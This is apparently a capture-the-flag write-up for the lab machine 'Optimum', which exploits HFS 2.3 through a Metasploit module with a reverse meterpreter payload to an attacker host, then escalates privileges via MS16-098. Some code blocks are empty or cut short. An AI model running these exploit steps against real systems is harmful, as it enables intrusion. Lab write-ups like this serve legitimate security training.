Todays box is `Optimum`, also known as `10.10.10.8`


The initial scan with nmap was pretty small - looks like the only attack surface visible is only port 80 on tcp.


Checking that out with the browser reveals the interface of [HFS](https://www.rejetto.com/hfs/) - a quick `searchsploit` reveals several vulnerabilities for the version 2.3, which is running on that box. Luckily, there is a `metasploit` module for that CVE. 

```bash
msfconsole
use windows/http/rejetto_hfs_exec
set rhost optimum.htb
set srvhost 10.10.14.46
set srvport 1337

So we have the user flag and know the username. 

Let's get some `sysinfo` and feed that into the [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

```bash

```

After checking out some others, _MS16-032_ looks more promising.

Check out the corresponding `metasploit` module for this. Also, take care, we are dealing with an `x64` installation! 

For this exploit to work, you need to set the initital meterpreter payload to `windows/x64/meterpreter/reverse_tcp` as well as the `TARGET` to `1` - which is also `x64`. 


For me it didn't work - the exploit went through, reported success but no shell spawned - so back to the list from `windows-exploit-suggester`...

After some unsuccesful attempts, _MS16-098_ seems to tick all the boxes.

```bash

Get the binary.

Upload the binary to the target.
